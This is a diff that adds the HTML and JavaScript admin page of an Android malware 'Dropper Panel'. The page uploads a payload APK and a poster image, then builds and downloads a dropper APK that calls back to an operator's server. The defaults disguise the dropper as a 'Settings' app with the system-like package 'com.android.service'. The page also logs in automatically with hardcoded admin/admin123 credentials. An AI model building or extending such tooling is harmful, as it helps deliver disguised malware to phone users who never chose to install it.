@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Dropper Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
+.header{background:#1e293b;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #334155}
+.header h1{font-size:18px;font-weight:700}
+.header .user{font-size:13px;color:#94a3b8}
+.card{background:#1e293b;border-radius:10px;padding:20px;margin-bottom:16px;border:1px solid #334155}
+.card h2{font-size:15px;font-weight:600;margin-bottom:14px;color:#f1f5f9}
+input,select,textarea{padding:10px 12px;border-radius:6px;border:1px solid #334155;background:#0f172a;color:#e2e8f0;font-size:13px;outline:none;width:100%;transition:border-color .15s}
+input:focus,select:focus,textarea:focus{border-color:#6366f1}
+input[type=file]{padding:6px}
+label{display:block;font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:5px;margin-top:12px}
+label:first-child{margin-top:0}
+.btn{padding:9px 18px;border-radius:6px;border:none;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s}
+.btn-primary{background:#6366f1;color:#fff}
+.btn-primary:hover{background:#4f46e5}
+.btn-danger{background:#dc2626;color:#fff}
+.btn-danger:hover{background:#b91c1c}
+.btn-sm{padding:5px 10px;font-size:11px}
+.mt-2{margin-top:12px}
+.mb-2{margin-bottom:12px}
+.text-muted{color:#94a3b8;font-size:12px}
+.content{padding:20px 24px;max-width:600px;margin:0 auto}
+.flex{display:flex;align-items:center;gap:8px}
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>Dropper Panel</h1>
+  <div class="flex">
+    <span class="user" id="userInfo">admin</span>
+    <button class="btn btn-sm btn-danger" onclick="logout()">Logout</button>
+  </div>
+</div>
+<div class="content">
+  <div class="card">
+    <h2>1. Upload Payload APK</h2>
+    <p class="text-muted mb-2">Your APK. Its icon will be used for the dropper.</p>
+    <input type="file" id="payloadFile" accept=".apk">
+    <button class="btn btn-primary mt-2" onclick="uploadPayload()">Upload</button>
+    <span id="uploadStatus" class="text-muted" style="margin-left:8px"></span>
+  </div>
+  <div class="card">
+    <h2>2. Upload Poster Image</h2>
+    <p class="text-muted mb-2">Background image shown on the dropper screen (1080x1920 recommended).</p>
+    <input type="file" id="posterFile" accept=".png,.jpg,.webp">
+    <button class="btn btn-primary mt-2" onclick="uploadPoster()">Upload</button>
+    <span id="posterStatus" class="text-muted" style="margin-left:8px"></span>
+  </div>
+  <div class="card">
+    <h2>3. Generate Dropper APK</h2>
+    <p class="text-muted mb-2">Build with your server URL. Uses uploaded icon + poster automatically.</p>
+    <label>Server URL</label>
+    <input id="dropperServerUrl" placeholder="http://your-server-ip:3000" value="http://10.0.2.2:3000">
+    <label>App Name</label>
+    <input id="dropperAppName" placeholder="App name shown on device" value="Settings">
+    <label>Payload Package Name</label>
+    <input id="dropperAppPackage" placeholder="com.package.name" value="com.android.service">
+    <button class="btn btn-primary mt-2" onclick="generateDropper()">Generate Dropper</button>
+    <div id="dropperStatus" class="mt-2"></div>
+  </div>
+</div>
+<script>
+const API = '';
+let lockToken = localStorage.getItem('lock_token');
+let adminToken = localStorage.getItem('admin_token');
+
+async function api(path, options = {}) {
+  const headers = { 'Content-Type': 'application/json', ...options.headers };
+  if (lockToken) headers['x-lock-token'] = lockToken;
+  if (adminToken) headers['x-admin-token'] = adminToken;
+  const res = await fetch(API + path, { ...options, headers });
+  if (res.status === 401) {
+    localStorage.removeItem('lock_token');
+    localStorage.removeItem('admin_token');
+    window.location.href = '/lock.html';
+  }
+  return res.json();
+}
+
+async function init() {
+  if (!lockToken) { window.location.href = '/lock.html'; return; }
+  const status = await api('/api/lock/status');
+  if (!status.authenticated) { window.location.href = '/lock.html'; return; }
+  if (!adminToken) {
+    const res = await api('/api/admin/login', {
+      method: 'POST', body: JSON.stringify({ username: 'admin', password: 'admin123' })
+    });
+    if (res.success) { adminToken = res.token; localStorage.setItem('admin_token', res.token); }
+  }
+}
+
+async function uploadPayload() {
+  const file = document.getElementById('payloadFile').files[0];
+  if (!file) { alert('Select an APK file'); return; }
+  const el = document.getElementById('uploadStatus');
+  el.textContent = 'Uploading...';
+  const form = new FormData();
+  form.append('apk', file);
+  try {
+    const res = await fetch('/api/admin/upload-payload', {
+      method: 'POST', headers: { 'x-lock-token': lockToken, 'x-admin-token': adminToken }, body: form
+    });
+    const data = await res.json();
+    el.textContent = data.success ? 'OK - icon extracted' : 'Failed';
+  } catch (e) { el.textContent = 'Error'; }
+}
+
+async function uploadPoster() {
+  const file = document.getElementById('posterFile').files[0];
+  if (!file) { alert('Select an image file'); return; }
+  const el = document.getElementById('posterStatus');
+  el.textContent = 'Uploading...';
+  const form = new FormData();
+  form.append('poster', file);
+  try {
+    const res = await fetch('/api/admin/upload-poster', {
+      method: 'POST', headers: { 'x-lock-token': lockToken, 'x-admin-token': adminToken }, body: form
+    });
+    const data = await res.json();
+    el.textContent = data.success ? 'Uploaded' : 'Failed';
+  } catch (e) { el.textContent = 'Error'; }
+}
+
+async function generateDropper() {
+  const serverUrl = document.getElementById('dropperServerUrl').value.trim();
+  const appName = document.getElementById('dropperAppName').value.trim();
+  const appPackage = document.getElementById('dropperAppPackage').value.trim();
+  if (!serverUrl || !appName) { alert('Server URL and App Name required'); return; }
+  const el = document.getElementById('dropperStatus');
+  el.innerHTML = '<span class="text-muted">Building... may take a minute</span>';
+  try {
+    const res = await fetch('/api/admin/generate-dropper', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-lock-token': lockToken, 'x-admin-token': adminToken },
+      body: JSON.stringify({ serverUrl, appName, packageName: appPackage })
+    });
+    if (!res.ok) {
+      const err = await res.json();
+      el.innerHTML = '<span style="color:#fca5a5">Failed: ' + (err.error || 'unknown') + '</span>';
+      return;
+    }
+    const blob = await res.blob();
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = 'indigo_dropper.apk'; a.click();
+    URL.revokeObjectURL(url);
+    el.innerHTML = '<span style="color:#6ee7b7">Downloaded</span>';
+  } catch (e) {
+    el.innerHTML = '<span style="color:#fca5a5">Error: ' + e.message + '</span>';
+  }
+}
+
+function logout() {
+  localStorage.removeItem('lock_token');
+  localStorage.removeItem('admin_token');
+  window.location.href = '/lock.html';
+}
+
+init();
+</script>
+</body>
+</html>
